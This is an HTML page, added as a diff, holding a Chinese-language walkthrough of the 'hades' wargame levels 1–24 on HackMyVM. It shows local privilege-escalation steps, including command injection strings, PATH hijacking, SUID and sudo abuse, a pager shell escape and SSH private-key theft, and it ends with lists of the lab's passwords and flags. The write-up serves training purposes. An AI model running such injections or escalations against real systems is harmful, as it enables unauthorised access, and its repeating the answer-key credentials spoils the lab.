@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="> 辅助AI：KIMI-K3
+
+## Mission 01: hacker -> acantha
+
+- **任务**：acantha 留了个 gift 给我们。">
+<meta property="og:title" content="hmv_Labs_hades1to24">
+<meta property="og:description" content="> 辅助AI：KIMI-K3
+
+## Mission 01: hacker -> acantha
+
+- **任务**：acantha 留了个 gift 给我们。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_Labs_hades1to24.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/217751621">
+<title>hmv_Labs_hades1to24</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_Labs_hades1to24</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/320" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><blockquote>
+<p>辅助AI：KIMI-K3</p>
+</blockquote>
+<h2>Mission 01: hacker -&gt; acantha</h2>
+<ul>
+<li><strong>任务</strong>：acantha 留了个 gift 给我们。</li>
+</ul>
+<p><code class="notranslate">/opt/gift_hacker</code> 是个 root 的 suid 程序，跑一下直接变成 acantha 的 shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">hacker@hades:<span class="pl-k">~</span>$ ls -la /opt/gift_hacker
+-rwSr-s--- 1 root hacker 16064 May  4 07:52 /opt/gift_hacker
+hacker@hades:<span class="pl-k">~</span>$ /opt/gift_hacker
+$ id
+uid=2043(acantha) gid=2001(hacker) groups=2001(hacker)
+$ cat /pazz/acantha_pass.txt
+mYYLhLBSkrzZqFydxGkn</pre></div>
+<ul>
+<li><strong>acantha</strong>: <code class="notranslate">mYYLhLBSkrzZqFydxGkn</code></li>
+</ul>
+<h2>Mission 02: acantha -&gt; alala</h2>
+<ul>
+<li><strong>任务</strong>：插入正确数字就给密码，其实就是猜一个 PIN。</li>
+</ul>
+<p>家目录有个 <code class="notranslate">guess</code>，本地反编译看到只读了一个数跟 <code class="notranslate">0x16f8</code> 比，即 5880。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">acantha@hades:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> 5880 <span class="pl-k">|</span> ./guess
+Enter PIN code:
+ DsYzpJQrCEndEWIMxWxu</pre></div>
+<ul>
+<li><strong>alala</strong>: <code class="notranslate">DsYzpJQrCEndEWIMxWxu</code></li>
+</ul>
+<h2>Mission 03: alala -&gt; althea</h2>
+<ul>
+<li><strong>任务</strong>：althea 喜欢读 Linux 帮助。</li>
+</ul>
+<p>家目录 <code class="notranslate">read</code> 是个 suid 程序，跑起来其实是 <code class="notranslate">man man</code>，pager 里 <code class="notranslate">!</code> 逃逸拿 shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">alala@hades:<span class="pl-k">~</span>$ ./read
+(man 界面里)
+<span class="pl-k">!</span>cat /pwned/alala/althea_pass.txt
+ObxEmwisYjERrDfvSbdA</pre></div>
+<ul>
+<li><strong>althea</strong>: <code class="notranslate">ObxEmwisYjERrDfvSbdA</code></li>
+</ul>
+<h2>Mission 04: althea -&gt; andromeda</h2>
+<ul>
+<li><strong>任务</strong>：andromeda 留了个列目录的程序。</li>
+</ul>
+<p><code class="notranslate">lsme</code> 提示 <code class="notranslate">Enter file to check:</code> 读一行做 <code class="notranslate">ls -la &lt;输入&gt;</code>，注入即可；注意 <code class="notranslate">scanf("%s")</code> 遇空格截断，命令里别用空格。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">althea@hades:<span class="pl-k">~</span>$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>x;cat&lt;andromeda_pass.txt\n<span class="pl-pds">'</span></span> <span class="pl-k">|</span> ./lsme
+OTWGTbHzrxhYFSTlKcOt</pre></div>
+<ul>
+<li><strong>andromeda</strong>: <code class="notranslate">OTWGTbHzrxhYFSTlKcOt</code></li>
+</ul>
+<h2>Mission 05: andromeda -&gt; anthea</h2>
+<ul>
+<li><strong>任务</strong>：anthea 让我们别忘了自己是谁。</li>
+</ul>
+<p><code class="notranslate">uid</code> 这个 suid 程序内部是 <code class="notranslate">system("id")</code>，PATH 劫持。但 <code class="notranslate">/tmp</code> 是 noexec，得用可写的 <code class="notranslate">/run/lock</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">andromeda@hades:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>#!/bin/sh</span>
+<span class="pl-s">cat /pwned/andromeda/anthea_pass.txt<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /run/lock/id
+andromeda@hades:<span class="pl-k">~</span>$ chmod +x /run/lock/id
+andromeda@hades:<span class="pl-k">~</span>$ PATH=/run/lock:<span class="pl-smi">$PATH</span> ./uid
+yWFLtSNQArEBTHtWgkKd
+andromeda@hades:<span class="pl-k">~</span>$ rm /run/lock/id</pre></div>
+<ul>
+<li><strong>anthea</strong>: <code class="notranslate">yWFLtSNQArEBTHtWgkKd</code></li>
+</ul>
+<h2>Mission 06: anthea -&gt; aphrodite</h2>
+<ul>
+<li><strong>任务</strong>：aphrodite 痴迷数字 94。</li>
+</ul>
+<p><code class="notranslate">obsessed</code> 读环境变量 <code class="notranslate">MYID</code>，取第一个字符的 ASCII 值。<code class="notranslate">^</code> 的 ASCII 是 94，过了就丢 shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">anthea@hades:<span class="pl-k">~</span>$ MYID=<span class="pl-s"><span class="pl-pds">'</span>^<span class="pl-pds">'</span></span> ./obsessed
+Current MYID: 94
+$ cat /pwned/anthea/aphrodite_pass.txt
+HPJVaqRzieKQeyyATsFv</pre></div>
+<ul>
+<li><strong>aphrodite</strong>: <code class="notranslate">HPJVaqRzieKQeyyATsFv</code></li>
+</ul>
+<h2>Mission 07: aphrodite -&gt; ariadne</h2>
+<ul>
+<li><strong>任务</strong>：ariadne 知道我们 HOME 里放了啥。</li>
+</ul>
+<p><code class="notranslate">homecontent</code> 把 <code class="notranslate">$HOME</code> 拼进命令里执行，注入 HOME 即可。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">aphrodite@hades:<span class="pl-k">~</span>$ HOME=<span class="pl-s"><span class="pl-pds">'</span>;cat ariadne_pass.txt<span class="pl-pds">'</span></span> ./homecontent
+The content of your HOME is:
+... ls 输出 ...
+iNgNazuJrmhJKWixktzk</pre></div>
+<ul>
+<li><strong>ariadne</strong>: <code class="notranslate">iNgNazuJrmhJKWixktzk</code></li>
+</ul>
+<h2>Mission 08: ariadne -&gt; arete</h2>
+<ul>
+<li><strong>任务</strong>：arete 允许我们用 cp。</li>
+</ul>
+<p><code class="notranslate">sudo -l</code>：(arete) NOPASSWD: /bin/cp。/run/lock 里有个 arete_pass.txt（440），直接 cp 会被目标权限带过去读不到；先建个 666 文件再覆盖，权限就保留了。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ariadne@hades:<span class="pl-k">~</span>$ install -m 666 /dev/null /tmp/x <span class="pl-k">&amp;&amp;</span> sudo -u arete /bin/cp /run/lock/arete_pass.txt /tmp/x <span class="pl-k">&amp;&amp;</span> cat /tmp/x
+QjrIovHacmGWxVjXRLmA</pre></div>
+<ul>
+<li><strong>arete</strong>: <code class="notranslate">QjrIovHacmGWxVjXRLmA</code></li>
+</ul>
+<h2>Mission 09: arete -&gt; artemis</h2>
+<ul>
+<li><strong>任务</strong>：artemis 给了我们某个 bin 当礼物。</li>
+</ul>
+<p><code class="notranslate">sudo -l</code>：(artemis) NOPASSWD: /sbin/capsh。capsh 的 <code class="notranslate">--</code> 之后参数会交给 /bin/bash。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">arete@hades:<span class="pl-k">~</span>$ sudo -u artemis /sbin/capsh -- -c <span class="pl-s"><span class="pl-pds">'</span>cat /usr/share/artemis_pass.txt<span class="pl-pds">'</span></span>
+HIiaojeORLaJBVSPDDCZ</pre></div>
+<ul>
+<li><strong>artemis</strong>: <code class="notranslate">HIiaojeORLaJBVSPDDCZ</code></li>
+</ul>
+<h2>Mission 10: artemis -&gt; asia</h2>
+<ul>
+<li><strong>任务</strong>：需要 /bin/bash 才能让 asia 给密码。</li>
+</ul>
+<p>artemis 登录 shell 是 rbash，<code class="notranslate">./restricted</code> 跑不动（带 <code class="notranslate">/</code> 的命令被禁）。先 <code class="notranslate">bash</code> 进普通 bash，再 <code class="notranslate">SHELL=/bin/bash ./restricted</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">artemis@hades:<span class="pl-k">~</span>$ bash
+artemis@hades:<span class="pl-k">~</span>$ SHELL=/bin/bash ./restricted
+Your SHELL is: /bin/bash
+djqWtkLisbQlrGtLYHCv</pre></div>
+<ul>
+<li><strong>asia</strong>: <code class="notranslate">djqWtkLisbQlrGtLYHCv</code></li>
+</ul>
+<h2>Mission 11: asia -&gt; asteria</h2>
+<ul>
+<li><strong>任务</strong>：asteria 教我们写 python。</li>
+</ul>
+<p><code class="notranslate">sudo -l</code>：(asteria) NOPASSWD: /usr/bin/python3。直接 -c 读文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">asia@hades:<span class="pl-k">~</span>$ sudo -u asteria /usr/bin/python3 -c <span class="pl-s"><span class="pl-pds">"</span>print(open('/usr/share/doc/asteria_pass.txt').read())<span class="pl-pds">"</span></span>
+hawMVJCYrBgoDAMVhuwT</pre></div>
+<ul>
+<li><strong>asteria</strong>: <code class="notranslate">hawMVJCYrBgoDAMVhuwT</code></li>
+</ul>
+<h2>Mission 12: asteria -&gt; astraea</h2>
+<ul>
+<li><strong>任务</strong>：astraea 信 magic。</li>
+</ul>
+<p><code class="notranslate">/var/www/html/sihiri.php</code> 把输入 md5 后用 <code class="notranslate">==</code> 比较，经典 0e 魔术哈希。<code class="notranslate">240610708</code> 的 md5 是 <code class="notranslate">0e462...</code> 全数字。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">asteria@hades:<span class="pl-k">~</span>$ curl -s <span class="pl-s"><span class="pl-pds">'</span>http://127.0.0.1/sihiri.php?pass=240610708<span class="pl-pds">'</span></span>
+nZkEYtjvHElOtupXKzTE</pre></div>
+<ul>
+<li><strong>astraea</strong>: <code class="notranslate">nZkEYtjvHElOtupXKzTE</code></li>
+</ul>
+<h2>Mission 13: astraea -&gt; atalanta</h2>
+<ul>
+<li><strong>任务</strong>：astraea 的 ssh 被 ForceCommand 锁死，但本机开了 vsftpd。</li>
+</ul>
+<p>astraea 走 ssh 只会 echo 一行，但用 FTP 登录能进她家目录，直接 get atalanta.txt。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">asteria@hades:<span class="pl-k">~</span>$ curl -s ftp://127.0.0.1/atalanta.txt --user <span class="pl-s"><span class="pl-pds">'</span>astraea:nZkEYtjvHElOtupXKzTE<span class="pl-pds">'</span></span>
+mUcSNQlaXtwSvGcgeTYZ</pre></div>
+<ul>
+<li><strong>atalanta</strong>: <code class="notranslate">mUcSNQlaXtwSvGcgeTYZ</code></li>
+</ul>
+<h2>Mission 14: atalanta -&gt; athena</h2>
+<ul>
+<li><strong>任务</strong>：athena 给了程序没给源码（给的 weird.c 是坑）。</li>
+</ul>
+<p><code class="notranslate">weird</code> 会把 <code class="notranslate">/var/lib/me</code> 的内容写到 <code class="notranslate">$HOME</code> 指向的文件里（euid=athena），然后 chmod 把文件改成 620 让我们读不到。先建个 666 文件再让 HOME 指过去，chmod 对别人属主的文件会失败，权限就保留了。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">atalanta@hades:<span class="pl-k">~</span>$ install -m 666 /dev/null /tmp/u63
+atalanta@hades:<span class="pl-k">~</span>$ HOME=/tmp/u63 ./weird
+atalanta@hades:<span class="pl-k">~</span>$ cat /tmp/u63
+kmQMpZsXgOsnzGReRcoV</pre></div>
+<ul>
+<li><strong>athena</strong>: <code class="notranslate">kmQMpZsXgOsnzGReRcoV</code></li>
+</ul>
+<h2>Mission 15: athena -&gt; aura</h2>
+<ul>
+<li><strong>任务</strong>：aura 给我们用她的新脚本。</li>
+</ul>
+<p><code class="notranslate">sudo -l</code>：(aura) NOPASSWD: /bin/bash -c /pwned/aura/auri.sh。脚本读一行 <code class="notranslate">$hackme</code> 当命令执行，但过滤了 <code class="notranslate">e/o/?</code> 等字符。<code class="notranslate">printf</code> 不含过滤字符，直接回显密码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">athena@hades:<span class="pl-k">~</span>$ sudo -u aura /bin/bash -c /pwned/aura/auri.sh
+What<span class="pl-k">?</span>
+<span class="pl-c1">printf</span>
+TiqpedAFjwmVyBlYpzRh</pre></div>
+<ul>
+<li><strong>aura</strong>: <code class="notranslate">TiqpedAFjwmVyBlYpzRh</code></li>
+</ul>
+<h2>Mission 16: aura -&gt; aegle</h2>
+<ul>
+<li><strong>任务</strong>：aegle 对数字记忆好。</li>
+</ul>
+<p><code class="notranslate">numbers</code> 一个一个读数字比较。逐位爆破（每位试 0-9，看 "Number OK" 数量增加），最终密码是 1231239111126。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">aura@hades:<span class="pl-k">~</span>$ ./numbers
+Enter one number:
+1
+Number OK
+... (逐位试出 1 2 3 1 2 3 9 1 1 1 1 2 6)
+Enter next number:
+6
+Number OK
+YRturIymmHSdBmEClEGe</pre></div>
+<ul>
+<li><strong>aegle</strong>: <code class="notranslate">YRturIymmHSdBmEClEGe</code></li>
+</ul>
+<h2>Mission 17: aegle -&gt; calliope</h2>
+<ul>
+<li><strong>任务</strong>：calliope 喜欢被人看。</li>
+</ul>
+<p><code class="notranslate">sudo -l</code>：(calliope) NOPASSWD: /bin/cat。家目录里直接没有 calliope_pass.txt，但有 <code class="notranslate">.ssh/id_rsa</code>。用私钥 ssh 登录 calliope。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">aegle@hades:<span class="pl-k">~</span>$ sudo -u calliope /bin/cat /pwned/calliope/.ssh/id_rsa <span class="pl-k">&gt;</span> /tmp/calli.key
+aegle@hades:<span class="pl-k">~</span>$ chmod 600 /tmp/calli.key
+aegle@hades:<span class="pl-k">~</span>$ ssh -i /tmp/calli.key calliope@127.0.0.1
+calliope@hades:<span class="pl-k">~</span>$</pre></div>
+<ul>
+<li><strong>calliope</strong>: ssh 私钥登录（密码无）</li>
+</ul>
+<h2>Mission 18: calliope -&gt; calypso</h2>
+<ul>
+<li><strong>任务</strong>：calypso 常用 write 交流。</li>
+</ul>
+<p><code class="notranslate">writeme</code> 默认说 "Cannot send you my pass"。先把终端设成可写（mesg y），再跑 writeme，密码夹在输出里冒出来。本机没 mesg，等价 <code class="notranslate">chmod o+w $(tty)</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">calliope@hades:<span class="pl-k">~</span>$ chmod o+w <span class="pl-s"><span class="pl-pds">$(</span>tty<span class="pl-pds">)</span></span>
+calliope@hades:<span class="pl-k">~</span>$ ./writeme
+Cannot send you my pass<span class="pl-k">!</span>...TAMYefoHcCPmexwImodo...</pre></div>
+<ul>
+<li><strong>calypso</strong>: <code class="notranslate">TAMYefoHcCPmexwImodo</code></li>
+</ul>
+<h2>Mission 19: calypso -&gt; cassandra</h2>
+<ul>
+<li><strong>任务</strong>：cassandra 想上电视。</li>
+</ul>
+<p>家目录 <code class="notranslate">cassy.wav</code>（8.7MB），90 秒 48kHz mono，是 SSTV 慢扫描电视信号。用在线 SSTV 解码器（decipher.wiki/sstv）解码，图里是密码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">calypso@hades:<span class="pl-k">~</span>$ scp -P 6666 cassy.wav kali@...
+<span class="pl-c"><span class="pl-c">#</span> 丢到 decipher.wiki/sstv 解码，图里显示密码</span></pre></div>
+<ul>
+<li><strong>cassandra</strong>: <code class="notranslate">CKzlnvmHQz</code></li>
+</ul>
+<h2>Mission 20: cassandra -&gt; cassiopeia</h2>
+<ul>
+<li><strong>任务</strong>：cassiopeia 能看到看不见的东西。</li>
+</ul>
+<p>家目录 <code class="notranslate">here.txt</code> 是一段 base64，解码后内容是一堆空白字符——whitespace 隐写。用 <code class="notranslate">stegsnow</code> 解码即可。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cassandra@hades:<span class="pl-k">~</span>$ cat here.txt <span class="pl-k">|</span> base64 -d <span class="pl-k">&gt;</span> here_flag
+cassandra@hades:<span class="pl-k">~</span>$ stegsnow here_flag
+gRqFnHblmZVZSfegPLvO</pre></div>
+<ul>
+<li><strong>cassiopeia</strong>: <code class="notranslate">gRqFnHblmZVZSfegPLvO</code></li>
+</ul>
+<h2>Mission 21: cassiopeia -&gt; clio</h2>
+<ul>
+<li><strong>任务</strong>：clio 讨厌空格。</li>
+</ul>
+<p><code class="notranslate">sudo -l</code>：(clio) NOPASSWD: /bin/bash -c /usr/local/src/differences.sh。脚本读一行，用 <code class="notranslate">IFS=0</code> 分割成两个文件名跑 <code class="notranslate">diff</code>，有空格就拒绝。clio 的密码在 <code class="notranslate">/var/local/clio_pass.txt</code>，用字符 <code class="notranslate">0</code> 做分隔符绕过空格限制。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cassiopeia@hades:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>/var/local/clio_pass.txt0/dev/null<span class="pl-pds">"</span></span> <span class="pl-k">|</span> sudo -u clio /bin/bash -c /usr/local/src/differences.sh
+1d0
+<span class="pl-k">&lt;</span> cqJqRPaUtuoUYXbaxnZq</pre></div>
+<ul>
+<li><strong>clio</strong>: <code class="notranslate">cqJqRPaUtuoUYXbaxnZq</code></li>
+</ul>
+<h2>Mission 22: clio -&gt; cybele</h2>
+<ul>
+<li><strong>任务</strong>：cybele 用她的"姓"做密码。</li>
+</ul>
+<p>"姓"指的是 /etc/passwd 里的 GECOS 字段（第 5 个字段）。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">clio@hades:<span class="pl-k">~</span>$ cat /etc/passwd <span class="pl-k">|</span> grep cybele
+cybele:x:2014:2014:UICacOPmJMWbKyPwNZod:/pwned/cybele:/bin/bash</pre></div>
+<p>密码就是 GECOS 字段的值。</p>
+<ul>
+<li><strong>cybele</strong>: <code class="notranslate">UICacOPmJMWbKyPwNZod</code></li>
+</ul>
+<h2>Mission 23: cybele -&gt; cynthia</h2>
+<ul>
+<li><strong>任务</strong>：cynthia 能看到别人看不到的东西。</li>
+</ul>
+<p>家目录 <code class="notranslate">fun.png</code>（3.2MB，1600x1980 RGBA），用 LSB 隐写在红色通道最低位。提取 Red plane 0，左上角有文字，OCR 即可。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cybele@hades:<span class="pl-k">~</span>$ scp -P 6666 fun.png kali@...
+<span class="pl-c"><span class="pl-c">#</span> 本地用 Python 提取 R 通道 bit0</span>
+python3 -c <span class="pl-s"><span class="pl-pds">"</span>from PIL import Image; img=Image.open('fun.png'); r,_,_,_=img.split(); out=Image.new('L',(1600,1980)); [out.putpixel((x,y),(r.getpixel((x,y))&amp;1)*255) for y in range(1980) for x in range(1600)]; out.crop((0,0,600,80)).save('red0.png')<span class="pl-pds">"</span></span>
+<span class="pl-c"><span class="pl-c">#</span> 识别出 QHLjXdGSiRShtWpMwFjj</span></pre></div>
+<ul>
+<li><strong>cynthia</strong>: <code class="notranslate">QHLjXdGSiRShtWpMwFjj</code></li>
+</ul>
+<h2>Mission 24: cynthia -&gt; daphne</h2>
+<ul>
+<li><strong>任务</strong>：daphne 说过 Gemini？gem-evil.hmv？WTF？</li>
+</ul>
+<p>靶机在 IPv6 [::1]:1965 跑了个 Gemini 服务。用 Python TLS 连上去发 gemini 请求，返回密码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cynthia@hades:<span class="pl-k">~</span>$ python3 -c <span class="pl-s"><span class="pl-pds">"</span></span>
+<span class="pl-s">import socket, ssl</span>
+<span class="pl-s">ctx = ssl.create_default_context()</span>
+<span class="pl-s">ctx.check_hostname = False</span>
+<span class="pl-s">ctx.verify_mode = ssl.CERT_NONE</span>
+<span class="pl-s">s = socket.create_connection(('::1', 1965))</span>
+<span class="pl-s">ss = ctx.wrap_socket(s, server_hostname='gem-evil.hmv')</span>
+<span class="pl-s">ss.sendall(b'gemini://gem-evil.hmv/\r\n')</span>
+<span class="pl-s">import time; time.sleep(3)</span>
+<span class="pl-s">print(ss.recv(4096).decode())</span>
+<span class="pl-s"><span class="pl-pds">"</span></span>
+20 text/gemini
+<span class="pl-c"><span class="pl-c">#</span> Welcome to mi Gemini Server!</span>
+<span class="pl-c"><span class="pl-c">#</span># What are you looking for?</span>
+EkdtKuXCJjlFKFpKgddX</pre></div>
+<ul>
+<li><strong>daphne</strong>: <code class="notranslate">EkdtKuXCJjlFKFpKgddX</code></li>
+</ul>
+<hr>
+<h1>Flag</h1>
+<pre class="notranslate"><code class="notranslate">01. acantha:     ^CaEuVJtJjaCwZtuuAFD^
+02. alala:       ^gTdGmkwhDrCqKrDQpxH^
+03. althea:      ^btDtPAPzSiXmoHItpqX^
+04. andromeda:   ^xzsHGrOeNctIZLGKzWq^
+05. anthea:      ^AcFLuAjhydNKIkPoFLL^
+06. aphrodite:   ^fmPlsDByrwmEpRAKgeP^
+07. ariadne:     ^FuGFaFNhtKNxUInxAtd^
+08. arete:       ^qmrrbGUXLTqLFDyCDlx^
+09. artemis:     ^SegGdzPgnNdGAmKjnsa^
+10. asia:        ^ngXdULWFWKCGtgxAQNv^
+11. asteria:     ^xSRhIftMsAwWvBAnqNZ^
+12. astraea:     ^KssHQIAFsxUamecyXIUk^
+13. atalanta:    ^XXZbDJTQQWCHJWTGeOw^
+14. athena:      ^oGwmbNYdtHwJgznZdur^
+15. aura:        ^YFMNmPnlKNpnWiYOhYy^
+16. aegle:       ^XCwOqgVvWpDVwPVVUJa^
+17. calliope:    ^rFWOMwBJDidqSNtEJGJ^
+18. calypso:     ^pssqdorRTYuTKuQBOYd^
+19. cassandra:   ^lntvcYNlazEljOyZYKz^
+20. cassiopeia:  ^GyWbcpEpqMsqMsjilzX^
+21. clio:        ^XUJbvPwAZYgoUgkpeSv^
+22. cybele:      ^bTsTIOmJELcaxEiIaCA^
+23. cynthia:     ^ZRSCKeYYlHkCEiHsEOI^
+24. daphne:      ^ieOhnUKZlYZSSrIPgaJ^
+</code></pre>
+<h1>Pass</h1>
+<pre class="notranslate"><code class="notranslate">01: acantha/mYYLhLBSkrzZqFydxGkn
+02: alala/DsYzpJQrCEndEWIMxWxu
+03: althea/ObxEmwisYjERrDfvSbdA
+04: andromeda/OTWGTbHzrxhYFSTlKcOt
+05: anthea/yWFLtSNQArEBTHtWgkKd
+06: aphrodite/HPJVaqRzieKQeyyATsFv
+07: ariadne/iNgNazuJrmhJKWixktzk
+08: arete/QjrIovHacmGWxVjXRLmA
+09: artemis/HIiaojeORLaJBVSPDDCZ
+10: asia/djqWtkLisbQlrGtLYHCv
+11: asteria/hawMVJCYrBgoDAMVhuwT
+12: astraea/nZkEYtjvHElOtupXKzTE
+13: atalanta/mUcSNQlaXtwSvGcgeTYZ
+14: athena/kmQMpZsXgOsnzGReRcoV
+15: aura/TiqpedAFjwmVyBlYpzRh
+16: aegle/YRturIymmHSdBmEClEGe
+17: calliope/(ssh 私钥)
+18: calypso/TAMYefoHcCPmexwImodo
+19: cassandra/CKzlnvmHQz
+20: cassiopeia/gRqFnHblmZVZSfegPLvO
+21: clio/cqJqRPaUtuoUYXbaxnZq
+22: cybele/UICacOPmJMWbKyPwNZod
+23: cynthia/QHLjXdGSiRShtWpMwFjj
+24: daphne/EkdtKuXCJjlFKFpKgddX
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 